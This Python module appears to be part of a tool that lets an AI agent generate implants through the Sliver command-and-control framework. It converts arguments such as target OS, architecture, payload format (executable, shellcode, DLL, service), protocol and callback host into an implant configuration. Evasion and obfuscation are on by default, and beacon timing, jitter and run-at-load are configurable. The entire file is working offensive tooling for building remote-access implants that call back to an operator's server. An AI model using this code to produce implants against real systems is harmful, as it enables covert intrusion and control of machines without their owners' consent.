"""Friendly parameters → a Sliver ``ImplantConfig`` protobuf.

``SliverClient.generate_implant`` takes a fully-formed ``ImplantConfig`` message,
not loose kwargs. This module is the one place that knows how to translate the
agent-facing arguments (os, arch, format, protocol, callback host/port, beacon
timing) into that message, so a sliver-py / protobuf change touches a single file.
"""

from __future__ import annotations

# Vendored stubs (not sliver-py's) so the ImplantConfig carries HTTPC2ConfigName
# and the Include* fields the current Sliver server requires. See _pb/__init__.py.
from ._pb import client_pb2

# OutputFormat enum: SHARED_LIB=0, SHELLCODE=1, EXECUTABLE=2, SERVICE=3, EXTERNAL=4
_FORMATS = {
    "exe": client_pb2.OutputFormat.EXECUTABLE,
    "executable": client_pb2.OutputFormat.EXECUTABLE,
    "shellcode": client_pb2.OutputFormat.SHELLCODE,
    "shared": client_pb2.OutputFormat.SHARED_LIB,
    "shared_lib": client_pb2.OutputFormat.SHARED_LIB,
    "dll": client_pb2.OutputFormat.SHARED_LIB,
    "so": client_pb2.OutputFormat.SHARED_LIB,
    "service": client_pb2.OutputFormat.SERVICE,
}

_DEFAULT_PORTS = {"https": 443, "http": 80, "mtls": 8888, "dns": 53, "wg": 53}
_VALID_PROTOCOLS = set(_DEFAULT_PORTS)
_VALID_OS = {"windows", "linux", "darwin"}
_NS = 1_000_000_000  # seconds → nanoseconds (Go time.Duration)


def c2_url(protocol: str, host: str, port: int = 0) -> str:
    """Build a Sliver C2 URL, e.g. ``https://redir.example.com:443``.

    For DNS, ``host`` is the parent canary domain and no port is appended.
    """
    protocol = protocol.lower()
    if protocol == "dns":
        return f"dns://{host}"
    if not port:
        port = _DEFAULT_PORTS.get(protocol, 443)
    return f"{protocol}://{host}:{port}"


def build_implant_config(
    *,
    os: str = "windows",
    arch: str = "amd64",
    fmt: str = "exe",
    protocol: str = "https",
    c2_host: str,
    c2_port: int = 0,
    is_beacon: bool = False,
    interval: int = 60,
    jitter: int = 30,
    reconnect: int = 60,
    evasion: bool = True,
    obfuscate: bool = True,
    debug: bool = False,
    run_at_load: bool = False,
    http_c2_config: str = "default",
) -> tuple[client_pb2.ImplantConfig, str]:
    """Return ``(ImplantConfig, c2_url)`` validated and ready for generation."""
    os = os.lower()
    arch = arch.lower()
    protocol = protocol.lower()
    fmt_key = fmt.lower()

    if os not in _VALID_OS:
        raise ValueError(f"os must be one of {sorted(_VALID_OS)}")
    if protocol not in _VALID_PROTOCOLS:
        raise ValueError(f"protocol must be one of {sorted(_VALID_PROTOCOLS)}")
    if fmt_key not in _FORMATS:
        raise ValueError(f"format must be one of {sorted(_FORMATS)}")
    if not c2_host:
        raise ValueError("c2_host is required (the callback host/domain)")

    out_format = _FORMATS[fmt_key]
    url = c2_url(protocol, c2_host, c2_port)

    # The implant codename is set on GenerateReq.Name, not on the config.
    cfg = client_pb2.ImplantConfig(
        GOOS=os,
        GOARCH=arch,
        IsBeacon=is_beacon,
        BeaconInterval=int(interval) * _NS if is_beacon else 0,
        BeaconJitter=int(jitter) * _NS if is_beacon else 0,
        ReconnectInterval=int(reconnect) * _NS,
        Evasion=evasion,
        ObfuscateSymbols=obfuscate,
        Debug=debug,
        RunAtLoad=run_at_load,
        Format=out_format,
        IsSharedLib=out_format == client_pb2.OutputFormat.SHARED_LIB,
        IsService=out_format == client_pb2.OutputFormat.SERVICE,
        IsShellcode=out_format == client_pb2.OutputFormat.SHELLCODE,
        # The server's Generate handler looks this up by name; "default" is the
        # built-in profile created on first run. Empty → "record not found".
        HTTPC2ConfigName=http_c2_config,
    )
    cfg.C2.append(client_pb2.ImplantC2(Priority=0, URL=url))
    return cfg, url
